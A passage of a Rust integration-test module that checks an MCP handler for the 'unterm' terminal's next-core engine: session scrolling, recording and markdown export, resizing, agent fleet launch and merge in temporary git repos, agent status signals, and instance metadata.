                        "pattern": "next-core-scroll-8",
                    }),
                )?;
                if search["total"].as_u64().unwrap_or_default() > 0 {
                    scrolled = handler.handle(
                        &ctx,
                        "screen.scroll",
                        &json!({
                            "pane_id": pane_id,
                            "offset": 1,
                            "count": 3,
                            "goto": true,
                        }),
                    )?;
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }

            let text = handler.handle(&ctx, "screen.text", &json!({ "pane_id": pane_id }))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((scrolled, text, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (scrolled, text, pane_id) =
            result.expect("screen.scroll goto updates next-core logical viewport");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(scrolled["scrolled_to"]["row"], 1);
        assert_eq!(scrolled["goto_skipped"], Value::Null);
        let returned = scrolled["lines"].as_array().expect("returned lines");
        assert!(returned
            .iter()
            .any(|line| line.as_str() == Some("next-core-scroll-2")));
        let visible = text["lines"].as_array().expect("visible lines");
        assert!(visible
            .iter()
            .any(|line| line.as_str() == Some("next-core-scroll-2")));
    }

    /// Without a front end, capture.scrollback says so rather than guessing.
    ///
    /// The renderer is built on a front end's font stack, so a surface with
    /// no front end genuinely cannot produce the image. Saying that is the
    /// correct answer; the rendered case is covered where a host exists.
    #[test]
    fn capture_scrollback_without_a_host_reports_no_front_end() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let handler = McpHandler::new();
        let ctx = ConnectionContext::internal("handler-test");
        let error = handler
            .handle(&ctx, "capture.scrollback", &json!({ "max_rows": 4 }))
            .expect_err("no front end can render");

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        assert!(
            error.to_string().contains("no front end is hosting"),
            "unexpected error: {error}"
        );
        assert_eq!(
            crate::meta::engine_capabilities("next-core")["diagnostics"]["styled_scrollback_png"],
            false
        );
    }

    #[test]
    fn recording_status_and_trace_attach_use_next_core_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let temp_root = std::env::temp_dir().join(format!(
            "unterm-next-core-trace-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .expect("system time")
                .as_nanos()
        ));
        let project_dir = temp_root.join("project");
        let export_path = temp_root.join("trace-export.md");
        std::fs::create_dir_all(&project_dir).expect("create temp project dir");

        let result: Result<(
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            usize,
        )> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 6,
                    "cwd": project_dir.display().to_string(),
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;

            handler.handle(
                &ctx,
                "session.recording_start",
                &json!({ "pane_id": pane_id }),
            )?;
            next_core().write_input(pane_id, "echo next-core-trace-attach\r")?;
            wait_for_screen_pattern(&handler, &ctx, pane_id, "next-core-trace-attach")?;

            let first_trace = handler.handle(
                &ctx,
                "session.recording_attach_trace",
                &json!({
                    "pane_id": pane_id,
                    "trace_id": "trace-next-core-1",
                }),
            )?;
            let second_trace = handler.handle(
                &ctx,
                "session.recording_attach_trace",
                &json!({
                    "pane_id": pane_id,
                    "trace_id": "trace-next-core-1",
                }),
            )?;
            let status = handler.handle(
                &ctx,
                "session.recording_status",
                &json!({ "pane_id": pane_id }),
            )?;
            let exported = handler.handle(
                &ctx,
                "session.export_markdown",
                &json!({
                    "pane_id": pane_id,
                    "path": export_path.display().to_string(),
                }),
            )?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));

            Ok((
                first_trace,
                second_trace,
                json!({ "status": status, "exported": exported }),
                pane_id,
            ))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (first_trace, second_trace, status_and_export, pane_id) =
            result.expect("attach recording trace through next-core engine");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(first_trace["trace_ids"], json!(["trace-next-core-1"]));
        assert_eq!(second_trace["trace_ids"], json!(["trace-next-core-1"]));
        let status = &status_and_export["status"];
        assert_eq!(status["enabled"], true);
        assert!(status["session_id"].as_str().is_some());
        assert!(status["started_at"].as_str().is_some());
        assert!(status["bytes"].as_u64().unwrap_or_default() > 0);
        let exported = &status_and_export["exported"];
        assert_eq!(exported["path"], export_path.display().to_string());
        let markdown = std::fs::read_to_string(&export_path).expect("read exported markdown");
        assert!(markdown.contains("trace_ids: [\"trace-next-core-1\"]"));
        assert!(markdown.contains("next-core-trace-attach"));
        let _ = std::fs::remove_dir_all(&temp_root);
    }

    #[test]
    fn active_recording_export_uses_next_core_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let temp_root = std::env::temp_dir().join(format!(
            "unterm-next-core-export-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .expect("system time")
                .as_nanos()
        ));
        let project_dir = temp_root.join("project");
        let export_path = temp_root.join("active-export.md");
        std::fs::create_dir_all(&project_dir).expect("create temp project dir");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            // Start a plain shell and drive it with input *after* the recording
            // attaches. Passing the command at create time raced the recording:
            // a short command finishes before `recording_start` runs, and a
            // recording that attaches after all the output has gone by captures
            // nothing, so the block assertions below could never be satisfied.
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 6,
                    "cwd": project_dir.display().to_string(),
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;

            handler.handle(
                &ctx,
                "session.recording_start",
                &json!({ "pane_id": pane_id }),
            )?;
            next_core().write_input(pane_id, "echo next-core-active-export\r")?;

            // Wait for both conditions the assertions below depend on.
            //
            // The marker alone is not enough: the shell echoes the typed
            // command line, which satisfies the search before the recording has
            // necessarily captured a block. Requiring a block too is what
            // actually proves an *active* recording is being exported.
            let mut search = json!({});
            let mut status = json!({});
            for _ in 0..100 {
                search = handler.handle(
                    &ctx,
                    "screen.search",
                    &json!({
                        "pane_id": pane_id,
                        "pattern": "next-core-active-export",
                    }),
                )?;
                status = handler.handle(
                    &ctx,
                    "session.recording_status",
                    &json!({ "pane_id": pane_id }),
                )?;
                if search["total"].as_u64().unwrap_or_default() > 0
                    && status["block_count"].as_u64().unwrap_or_default() >= 1
                {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            assert!(
                search["total"].as_u64().unwrap_or_default() > 0,
                "recording export marker was not visible in next-core screen search: {}",
                search
            );
            assert!(
                status["block_count"].as_u64().unwrap_or_default() >= 1,
                "next-core recording captured no blocks while active: {}",
                status
            );

            let exported = handler.handle(
                &ctx,
                "session.export_markdown",
                &json!({
                    "pane_id": pane_id,
                    "path": export_path.display().to_string(),
                }),
            )?;

            let _ = handler.handle(
                &ctx,
                "session.recording_stop",
                &json!({ "pane_id": pane_id }),
            );
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));

            Ok((exported, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (exported, pane_id) = result.expect("export active next-core recording");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(exported["path"], export_path.display().to_string());
        assert!(exported["bytes"].as_u64().unwrap_or_default() > 0);
        assert!(exported["block_count"].as_u64().unwrap_or_default() >= 1);
        let markdown = std::fs::read_to_string(&export_path).expect("read exported markdown");
        assert!(markdown.contains("next-core-active-export"));
        std::fs::remove_dir_all(&temp_root).ok();
    }

    #[test]
    fn inactive_scrollback_export_markdown_uses_next_core_screen_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let temp_root = std::env::temp_dir().join(format!(
            "unterm-next-core-inactive-export-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .expect("system time")
                .as_nanos()
        ));
        let project_dir = temp_root.join("project");
        let export_path = temp_root.join("inactive-export.md");
        std::fs::create_dir_all(&project_dir).expect("create temp project dir");

        let result: Result<(serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 6,
                    "cwd": project_dir.display().to_string(),
                    "command": "echo next-core-inactive-export",
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            wait_for_screen_pattern(&handler, &ctx, pane_id, "next-core-inactive-export")?;

            let exported = handler.handle(
                &ctx,
                "session.export_markdown",
                &json!({
                    "pane_id": pane_id,
                    "path": export_path.display().to_string(),
                }),
            )?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));

            Ok((exported, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (exported, pane_id) = result.expect("export inactive next-core scrollback");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(exported["path"], export_path.display().to_string());
        assert!(exported["bytes"].as_u64().unwrap_or_default() > 0);
        assert!(exported["block_count"].as_u64().unwrap_or_default() >= 1);
        let markdown = std::fs::read_to_string(&export_path).expect("read exported markdown");
        assert!(markdown.contains("next-core-inactive-export"));
        std::fs::remove_dir_all(&temp_root).ok();
    }

    #[test]
    fn session_resize_uses_next_core_pane_id_path() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;

            let resized = handler.handle(
                &ctx,
                "session.resize",
                &json!({
                    "pane_id": pane_id,
                    "cols": 100,
                    "rows": 8,
                }),
            )?;
            let session = handler.handle(&ctx, "session.get", &json!({ "pane_id": pane_id }))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));

            Ok((resized, session, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (resized, session, pane_id) = result.expect("resize next-core session through handler");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(resized["status"], "ok");
        assert_eq!(session["cols"], 100);
        assert_eq!(session["rows"], 8);
    }

    #[test]
    fn fleet_lifecycle_uses_next_core_session_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        let previous_fleets_path = std::env::var("UNTERM_FLEETS_PATH").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let temp_root = std::env::temp_dir().join(format!(
            "unterm-next-core-fleet-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .expect("system time")
                .as_nanos()
        ));
        let repo = temp_root.join("repo");
        std::fs::create_dir_all(&repo).expect("create temp repo");
        std::env::set_var(
            "UNTERM_FLEETS_PATH",
            temp_root.join("fleets.json").display().to_string(),
        );
        unterm_services::cockpit::fleet::reset_store_for_tests();

        let run_git = |args: &[&str]| -> Result<()> {
            let out = std::process::Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(args)
                .output()
                .with_context(|| format!("run git {args:?}"))?;
            if !out.status.success() {
                return Err(anyhow!(
                    "git {:?}: {}",
                    args,
                    String::from_utf8_lossy(&out.stderr).trim()
                ));
            }
            Ok(())
        };
        run_git(&["init", "-b", "main"]).expect("git init");
        run_git(&["config", "user.email", "test@unterm.invalid"]).expect("git email");
        run_git(&["config", "user.name", "Unterm Test"]).expect("git name");
        std::fs::write(repo.join("README.md"), "fleet test\n").expect("write readme");
        run_git(&["add", "README.md"]).expect("git add");
        run_git(&["commit", "-m", "initial"]).expect("git commit");

        let result: Result<(
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            Option<String>,
        )> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let launched = handler.handle(
                &ctx,
                "fleet.launch",
                &json!({
                    "cwd": repo.display().to_string(),
                    "task": "next-core-fleet",
                    "agents": ["echo"],
                }),
            )?;
            let retried = handler.handle(
                &ctx,
                "fleet.retry",
                &json!({
                    "fleet_id": launched["id"],
                    "member": "1",
                }),
            )?;
            let retried_pane_id = retried["pane_id"].as_u64().expect("retried pane id") as usize;
            let retried_cwd = next_core().get_session(retried_pane_id)?.shell.cwd;
            let cleaned = handler.handle(
                &ctx,
                "fleet.clean",
                &json!({
                    "id": launched["id"],
                    "force": true,
                }),
            )?;
            Ok((launched, retried, cleaned, retried_cwd))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }
        match previous_fleets_path {
            Some(value) => std::env::set_var("UNTERM_FLEETS_PATH", value),
            None => std::env::remove_var("UNTERM_FLEETS_PATH"),
        }

        let (fleet, retried, cleaned, retried_cwd) =
            result.expect("launch, retry, and clean fleet through next-core engine");
        let old_pane_id = fleet["members"][0]["pane_id"]
            .as_u64()
            .expect("fleet member pane id") as usize;
        let new_pane_id = retried["pane_id"].as_u64().expect("retried member pane id") as usize;
        assert_ne!(old_pane_id, new_pane_id);
        assert!(next_core().get_session(old_pane_id).is_err());
        assert!(retried_cwd
            .as_deref()
            .unwrap_or_default()
            .contains(".fleet"));
        assert_eq!(fleet["members"][0]["agent"], "echo");
        assert_eq!(retried["agent"], "echo");
        assert_eq!(retried["attempt"], 2);
        assert_eq!(retried["last_launch_error"], Value::Null);
        assert_eq!(cleaned["ok"], true);
        assert_eq!(cleaned["id"], fleet["id"]);
        assert!(next_core().get_session(new_pane_id).is_err());
        assert!(
            unterm_services::cockpit::fleet::get(fleet["id"].as_str().expect("fleet id")).is_none()
        );

        unterm_services::cockpit::fleet::reset_store_for_tests();
        std::fs::remove_dir_all(&temp_root).ok();
    }

    #[test]
    fn review_rollback_requires_explicit_confirmation_at_the_mcp_boundary() {
        let error = McpHandler::new()
            .review_rollback(&json!({
                "repo": "must-not-be-touched",
                "sha": "must-not-be-used",
            }))
            .expect_err("rollback without confirmation must be rejected");

        assert!(error.to_string().contains("'confirm': true"));
    }

    #[test]
    fn review_diff_does_not_require_wezterm_mux_in_next_core_mode() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result: Result<(serde_json::Value, PathBuf)> = (|| {
            let repo = tmp_review_repo()?;
            let base = git_test(&repo, &["rev-parse", "HEAD"])?;
            std::fs::write(repo.join("a.txt"), "one\ntwo\n")?;
            std::fs::write(repo.join("new.txt"), "fresh\n")?;

            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let diff = handler.handle(
                &ctx,
                "review.diff",
                &json!({
                    "repo": repo.display().to_string(),
                    "from": base,
                }),
            )?;
            Ok((diff, repo))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (diff, repo) = result.expect("review.diff through next-core mode");
        let files = diff["files"].as_array().expect("diff files");
        assert!(files.iter().any(|file| file["path"] == "a.txt"));
        assert!(files
            .iter()
            .any(|file| file["path"] == "new.txt" && file["untracked"] == true));
        let patch = diff["patch"].as_str().expect("diff patch");
        assert!(patch.contains("+two"));
        assert!(patch.contains("+fresh"));
        std::fs::remove_dir_all(repo).ok();
    }

    #[test]
    fn review_verify_and_merge_work_for_next_core_fleet_member() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        let previous_fleets_path = std::env::var("UNTERM_FLEETS_PATH").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let temp_root = std::env::temp_dir().join(format!(
            "unterm-next-core-review-fleet-{}-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_millis(),
            NEXT_TMP_REVIEW_REPO.fetch_add(1, Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&temp_root).expect("create temp root");
        std::env::set_var(
            "UNTERM_FLEETS_PATH",
            temp_root.join("fleets.json").display().to_string(),
        );
        unterm_services::cockpit::fleet::reset_store_for_tests();

        let result: Result<(
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            PathBuf,
        )> = (|| {
            let repo = tmp_review_repo()?;
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let launched = handler.handle(
                &ctx,
                "fleet.launch",
                &json!({
                    "cwd": repo.display().to_string(),
                    "task": "next-core-review-merge",
                    "agents": ["echo"],
                }),
            )?;
            let fleet_id = launched["id"].as_str().expect("fleet id").to_owned();
            let worktree = PathBuf::from(
                launched["members"][0]["worktree"]
                    .as_str()
                    .expect("member worktree"),
            );
            std::fs::write(worktree.join("review.txt"), "merged by next-core review\n")?;
            git_test(&worktree, &["add", "-A"])?;
            git_test(&worktree, &["commit", "-q", "-m", "member change"])?;

            let verify = handler.handle(
                &ctx,
                "review.verify",
                &json!({
                    "fleet_id": fleet_id,
                    "member": "1",
                    "command": "git status --short",
                    "timeout_secs": 5,
                }),
            )?;
            let verification_id = verify["id"].as_str().expect("verification id");
            let passed = wait_for_verification_passed(verification_id)?;
            let merged = handler.handle(
                &ctx,
                "review.merge",
                &json!({
                    "fleet_id": fleet_id,
                    "member": "1",
                }),
            )?;
            let cleaned = handler.handle(
                &ctx,
                "fleet.clean",
                &json!({
                    "id": launched["id"],
                    "force": true,
                }),
            )?;
            Ok((serde_json::to_value(passed)?, merged, cleaned, repo))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }
        match previous_fleets_path {
            Some(value) => std::env::set_var("UNTERM_FLEETS_PATH", value),
            None => std::env::remove_var("UNTERM_FLEETS_PATH"),
        }

        let (verification, merged, cleaned, repo) =
            result.expect("verify and merge next-core fleet member");
        assert_eq!(verification["status"], "passed");
        assert_eq!(verification["inferred"], false);
        assert_eq!(merged["ok"], true);
        assert_eq!(merged["verification_forced"], false);
        assert_eq!(merged["verification"]["status"], "passed");
        let staged_files = merged["staged_files"].as_array().expect("staged files");
        assert!(staged_files.iter().any(|file| file == "review.txt"));
        assert_eq!(cleaned["ok"], true);
        assert_eq!(
            git_test(&repo, &["diff", "--cached", "--name-only"])
                .expect("read staged files after merge"),
            "review.txt"
        );

        unterm_services::cockpit::fleet::reset_store_for_tests();
        std::fs::remove_dir_all(&repo).ok();
        std::fs::remove_dir_all(&temp_root).ok();
    }

    #[test]
    fn agent_status_uses_pane_id_registry_path() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");
        unterm_services::cockpit::status::reset_for_tests();

        let result: Result<(serde_json::Value, serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            assert!(unterm_services::cockpit::on_hook_signal(
                pane_id as u64,
                "codex",
                "waiting"
            ));

            let single = handler.handle(
                &ctx,
                "agent.status",
                &json!({
                    "pane_id": pane_id,
                }),
            )?;
            let all = handler.handle(&ctx, "agent.status", &json!({}))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((single, all, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (single, all, pane_id) = result.expect("read cockpit status through handler");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(single["enabled"], true);
        assert_eq!(single["agent"]["pane_id"], pane_id as u64);
        assert_eq!(single["agent"]["agent"], "codex");
        assert_eq!(single["agent"]["state"], "waiting");
        assert_eq!(all["enabled"], true);
        assert!(all["agents"]
            .as_array()
            .unwrap()
            .iter()
            .any(|entry| { entry["pane_id"] == pane_id as u64 && entry["state"] == "waiting" }));
        unterm_services::cockpit::status::reset_for_tests();
    }

    #[test]
    fn agent_signal_uses_explicit_pane_id_registry_path() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");
        unterm_services::cockpit::status::reset_for_tests();

        let result: Result<(serde_json::Value, serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            let signal = handler.handle(
                &ctx,
                "agent.signal",
                &json!({
                    "pane_id": pane_id,
                    "agent": "claude",
                    "event": "waiting",
                }),
            )?;
            let status = handler.handle(
                &ctx,
                "agent.status",
                &json!({
                    "pane_id": pane_id,
                }),
            )?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((signal, status, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (signal, status, pane_id) = result.expect("signal cockpit status through handler");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(signal["ok"], true);
        assert_eq!(signal["pane_id"], pane_id as u64);
        assert_eq!(signal["agent"], "claude");
        assert_eq!(signal["event"], "waiting");
        assert_eq!(status["agent"]["pane_id"], pane_id as u64);
        assert_eq!(status["agent"]["agent"], "claude");
        assert_eq!(status["agent"]["state"], "waiting");
        unterm_services::cockpit::status::reset_for_tests();
    }

    #[test]
    fn agent_signal_rejects_stale_explicit_pane_id() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");
        unterm_services::cockpit::status::reset_for_tests();

        let result = {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            handler.handle(
                &ctx,
                "agent.signal",
                &json!({
                    "pane_id": 999999999_u64,
                    "agent": "claude",
                    "event": "waiting",
                }),
            )
        };

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let err = result.expect_err("stale explicit pane id should be rejected");
        assert!(err.to_string().contains("resolve pane"), "{}", err);
        assert!(unterm_services::cockpit::snapshot().is_empty());
        unterm_services::cockpit::status::reset_for_tests();
    }

    #[test]
    fn agent_signal_fallback_uses_terminal_engine_active_session() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");
        unterm_services::cockpit::status::reset_for_tests();

        let result: Result<(serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            let signal = handler.handle(
                &ctx,
                "agent.signal",
                &json!({
                    "agent": "codex",
                    "event": "working",
                }),
            )?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((signal, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (signal, pane_id) = result.expect("signal active session through selected engine");
        assert_eq!(signal["ok"], true);
        assert_eq!(signal["pane_id"], pane_id as u64);
        assert_eq!(signal["agent"], "codex");
        assert_eq!(signal["event"], "working");
        unterm_services::cockpit::status::reset_for_tests();
    }

    #[test]
    fn cockpit_inbox_uses_engine_session_snapshot() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");
        unterm_services::cockpit::status::reset_for_tests();

        let result: Result<(serde_json::Value, usize)> = (|| {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let created = handler.handle(
                &ctx,
                "session.create",
                &json!({
                    "cols": 80,
                    "rows": 4,
                }),
            )?;
            let pane_id = created["id"].as_u64().expect("session id") as usize;
            let _ = handler.handle(
                &ctx,
                "agent.signal",
                &json!({
                    "pane_id": pane_id,
                    "agent": "codex",
                    "event": "working",
                }),
            )?;
            let inbox = handler.handle(&ctx, "cockpit.inbox", &json!({}))?;
            let _ = handler.handle(&ctx, "session.destroy", &json!({ "pane_id": pane_id }));
            Ok((inbox, pane_id))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (inbox, pane_id) = result.expect("read inbox through next-core engine snapshots");
        assert!(next_core().get_session(pane_id).is_err());
        assert_eq!(inbox["enabled"], true);
        let item = inbox["items"]
            .as_array()
            .unwrap()
            .iter()
            .find(|entry| entry["pane_id"] == pane_id as u64)
            .expect("inbox entry");
        // Whatever the engine calls the pane, not a name spelled here: a
        // shell sets its own console title when it feels like it, so a
        // hard-coded "next-core:N" is a race against cmd.exe rather than a
        // check that the inbox reads the engine.
        assert_eq!(item["pane_title"], item["session"]["title"]);
        assert!(
            item["session"]["title"].is_string(),
            "the inbox should carry whatever title the engine reported"
        );
        assert_eq!(item["session"]["id"], pane_id as u64);
        assert_eq!(item["session"]["engine"], "next-core");
        assert_eq!(item["session"]["is_active"], true);
        assert_eq!(item["window_id"], 0);
        assert_eq!(item["tab_id"], pane_id as u64);
        unterm_services::cockpit::status::reset_for_tests();
    }

    #[test]
    /// ...nor a front end: the labels below are the headless ones.
    fn instance_metadata_methods_do_not_require_terminal_engine() {
        let _guard = env_lock().lock();
        unterm_engine::install_next_core_provider();
        let previous_engine = std::env::var("UNTERM_ENGINE").ok();
        std::env::set_var("UNTERM_ENGINE", "next-core");

        let result = (|| -> Result<(
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            serde_json::Value,
            Result<serde_json::Value>,
        )> {
            let handler = McpHandler::new();
            let ctx = ConnectionContext::internal("handler-test");
            let server = handler.handle(&ctx, "server.info", &json!({}))?;
            let info = handler.handle(&ctx, "instance.info", &json!({}))?;
            let list = handler.handle(&ctx, "instance.list", &json!({}))?;
            let lifecycle = handler.handle(&ctx, "instance.lifecycle", &json!({}))?;
            let close = handler.handle(&ctx, "instance.close", &json!({}))?;
            let title = handler.handle(&ctx, "instance.set_title", &json!({ "title": null }))?;
            let focus = handler.handle(&ctx, "instance.focus", &json!({}));
            Ok((server, info, list, lifecycle, close, title, focus))
        })();

        match previous_engine {
            Some(value) => std::env::set_var("UNTERM_ENGINE", value),
            None => std::env::remove_var("UNTERM_ENGINE"),
        }

        let (server, info, list, lifecycle, close, title, focus) =
            result.expect("read instance metadata without WezTerm mux");
        assert_eq!(server["lifecycle"]["registry_owner"], "server_info");
        assert_eq!(server["lifecycle"]["window_owner"], "none");
        assert_eq!(server["lifecycle"]["native_window_lifecycle"], "none");
        assert!(info.get("id").is_some());
        assert!(info.get("pid").is_some());
        assert!(info.get("mcp_port").is_some());
        assert_eq!(info["window"]["engine"], "next-core");
        assert_eq!(info["window"]["title_owner"], "server_info");
        assert_eq!(info["window"]["focus_owner"], "none");
        assert_eq!(info["window"]["uses_host_window"], false);
        assert_eq!(info["lifecycle"]["state"], "live");
        assert_eq!(info["lifecycle"]["liveness_source"], "pid");
        assert_eq!(info["lifecycle"]["registry_owner"], "server_info");
        assert_eq!(info["lifecycle"]["metadata_owner"], "product_registry");
        assert_eq!(info["lifecycle"]["window_owner"], "none");
        assert_eq!(info["lifecycle"]["title_owner"], "server_info");
        assert_eq!(info["lifecycle"]["focus_owner"], "none");
        assert_eq!(info["lifecycle"]["native_window_lifecycle"], "none");
        assert_eq!(info["lifecycle"]["uses_host_window"], false);
        assert_eq!(info["lifecycle"]["values_redacted"], true);
        assert!(list["instances"].is_array());
        for item in list["instances"].as_array().expect("instances array") {
            assert_eq!(item["lifecycle"]["state"], "live");
            assert_eq!(item["lifecycle"]["registry_owner"], "server_info");
